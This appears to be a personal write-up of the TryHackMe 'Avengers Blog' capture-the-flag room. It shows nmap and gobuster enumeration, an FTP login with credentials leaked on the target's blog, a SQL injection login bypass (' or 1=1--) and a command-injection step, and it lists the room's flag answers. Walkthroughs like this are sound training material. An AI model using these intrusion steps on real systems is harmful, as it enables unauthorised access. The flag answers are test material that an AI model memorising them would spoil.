<p align="center">December 5, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{214}}$$-day-streak in  <a href="https://tryhackme">TryHackMe</a>.</p>

<p align="center"> <img width="150px" src="https://github.com/user-attachments/assets/f89568a0-f6a1-4b0a-bc4c-efe105fbe539"></p>


<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Avengers Blog}}$$
</h1>
<p align="center">Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection.</p>
<p align="center">Access this TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/avengers">Avengers Blog</a>.</p>
<p align="center">Note that only subscribers can deploy virtual machines in this room.</p>

                                                              
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/20325c1e-980c-4c24-a215-f61c8cd38a37">
  <img width="700px" src="https://github.com/user-attachments/assets/273e11ef-23da-45da-9624-8de051162431">
</p>

<br>

<h2>Task 1. Deploy</h2>

<br>

<code>No answer needed</code>

<br>

<code>No answer needed</code>

<br>

<h2>Task 2. Cookies</h2>

<br>

![image](https://github.com/user-attachments/assets/b418cb0b-8ba5-4ace-b1ca-9c26d2155876)

<br>

![image](https://github.com/user-attachments/assets/3fbff5ca-0e71-4ec5-b9fe-39f6879c4f1c)

<br>

<code>cookie_secrets</code>

<br>

<h2>Task 3. HTTP Headers</h2>
<p>HTTP Headers let a client and server pass information with an HTTP request or response. Header names and values are separated by a single colon and, are an integral part of the HTTP protocol.</p>

![image](https://github.com/user-attachments/assets/36620849-a380-4c48-8199-339db2c42f54)


<p>The main two HTTP Methods are POST and GET requests. The GET method is used to request data from a resource and the POST method is used to send data to a server.<br>

We can view requests made to and from our browser by opening the Developer Tools again and navigating to the Network tab. Have this tab open and refresh the page to see all requests made. You will be able to see the original request made from your browser to the web server. </p>

<br>

![image](https://github.com/user-attachments/assets/894a81f1-c4d0-4383-8345-0bf33b8e1c6e)

<br>

<code>headers_are_important</code>

<br>

<h2>Task 4. Enumeration and FTP</h2>

![image](https://github.com/user-attachments/assets/fd13d824-5676-40c3-9053-2ab0c296cdb0)


<p>In this task we will scan the machine with nmap (a network scanner) and access the FTP service using reusable credentials.<br>

Lets get started by scanning the machine, you will need nmap. If you don't have the application installed you can use our web-based AttackBox that has nmap pre-installed.<br>


In your terminal, execute the following command:<br>
<code>nmap <machine_ip> -v</code>

 This will scan the machine and determine what services on which ports are running. For this machine, you will see the following ports open:</p>

 ![image](https://github.com/user-attachments/assets/f39acee6-436c-4682-a84c-2e556d393f03)

<p>Port 80 has a HTTP web server running on<br>
Port 22 is to SSH into the machine<br>
Port 21 is used for FTP (file transfer)<br>

We've accessed the web server, lets now access the FTP service. If you read the Avengers web page, you will see that Rocket made a post asking for Groot's password to be reset, the post included his old password too!<br>

In your terminal, execute the following command:<br>
<code>ftp <machine_ip></code>

We will be asked for a username (groot) and a password (iamgroot). We should have now successfully logged into the FTP share using Groots credentials!</p>

<pre><code>root@[THM AttackBox]:~/AvengersBlog# nmap [Target] -v
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-06 03:28 GMT
Initiating ARP Ping Scan at 03:28
Scanning [Target] [1 port]
Completed ARP Ping Scan at 03:28, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:28
Completed Parallel DNS resolution of 1 host. at 03:28, 0.00s elapsed
Initiating SYN Stealth Scan at 03:28
Scanning ip-10-10-81-91.eu-west-1.compute.internal ([Target]) [1000 ports]
Discovered open port 21/tcp on [Target]
Discovered open port 22/tcp on [Target]
Discovered open port 80/tcp on [Target]
Completed SYN Stealth Scan at 03:28, 0.09s elapsed (1000 total ports)
Nmap scan report for [Target].eu-west-1.compute.internal ([Target])
Host is up (0.00043s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:3D:94:9D:89:F3 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)
</code></pre>

<br>

<pre><code>root@[THM AttackBox]:~/AvengersBlog# ftp [Target]
Connected to [Target].
220 (vsFTPd 3.0.3)
Name (10.10.81.91:root): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,81,91,183,165).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> ls -la
227 Entering Passive Mode (10,10,81,91,192,207).
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 .
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,10,81,91,184,100).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
227 Entering Passive Mode (10,10,81,91,172,207).
150 Opening BINARY mode data connection for flag3.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (11.4238 kB/s)
ftp> exit
221 Goodbye.
</code></pre>

<br>

<pre><code>root@[THM AttackBox]:~/AvengersBlog# cat flag3.txt
8fc651a739befc58d450dc48e1f1fd2e
</code></pre>

<br>

<code>8fc651a739befc58d450dc48e1f1fd2e</code>

<br>

<h2>Task 5. Gobuster</h2>

<p align="center"> <img width="100px" src="https://github.com/user-attachments/assets/13590ec6-2a6b-4f02-983b-c138b566e006"></p>

<p>Lets use a fast directory discovery tool called GoBuster. This program will locate a directory that you can use to login to Mr. Starks Tarvis portal!<br>

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.<br>

You can either download GoBuster, or use the Kali Linux machine that has it pre-installed.<br>

Lets run GoBuster with a wordlist (on Kali they're located under /usr/share/wordlists):<br>
<code>gobuster dir -u http://<machine_ip> -w <word_list_location></code></p>

<br>

<code>/portal</code>

<pre><code>oot@[THM AttackBox]:~/AvengersBlog# gobuster dir -u http://[Target] -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target]
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 23] [--> /]
/img                  (Status: 301) [Size: 173] [--> /img/]
/Home                 (Status: 302) [Size: 23] [--> /]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/portal               (Status: 200) [Size: 1409]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/logout               (Status: 302) [Size: 29] [--> /portal]
/Portal               (Status: 200) [Size: 1409]
/HOME                 (Status: 302) [Size: 23] [--> /]
/Logout               (Status: 302) [Size: 29] [--> /portal]
/stones               (Status: 301) [Size: 179] [--> /stones/]
/PORTAL               (Status: 200) [Size: 1409]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/9fcf87fb-11c4-4c75-9a78-51625b069d1c"></p>

<br>

<h2>Task 6. SQL Injection</h2>

<p>I used <code>' or 1=1--</code>.</p>

![image](https://github.com/user-attachments/assets/6a01e289-aa62-466b-a111-427689405b33)


<p>And got access to the following ...</p>

![image](https://github.com/user-attachments/assets/9eae9461-2b40-464b-82ff-6d7531bebb7d)

<br>

![image](https://github.com/user-attachments/assets/b56a2588-dc28-41c4-99ce-ef1c43b2ae31)

<br>

<code>223</code>


<br>



<h2>Task 7. Remote Code Execution and Linux</h2>


<br>

<p>I used the command <code>ls</code>.</p>

![image](https://github.com/user-attachments/assets/cbad90d6-fc63-4409-a27d-ea7a44778529)

<br>

![image](https://github.com/user-attachments/assets/3c6cbd4f-5bd1-4ca7-9070-9e050d46a92a)

<br>

![image](https://github.com/user-attachments/assets/6c5c3dfe-271c-452d-bb29-20ecbc90d135)

<br>


![image](https://github.com/user-attachments/assets/e78a4122-c8a6-49ed-a0d3-64ff9d83e3fc)

<br>

<code>d335e2d13f36558ba1e67969a1718af7</code>

<br>

<h2>Room Completed</h2>

![image](https://github.com/user-attachments/assets/08356a0d-b769-4e43-a2cd-0b6a0c710744)

<br>

![image](https://github.com/user-attachments/assets/b561da95-324e-4edf-b47c-d0522d8c54b9)

<br>

<h2>My Journey</h2>


![image](https://github.com/user-attachments/assets/a00b53de-a49f-44d9-afb3-e3a21699ff13)













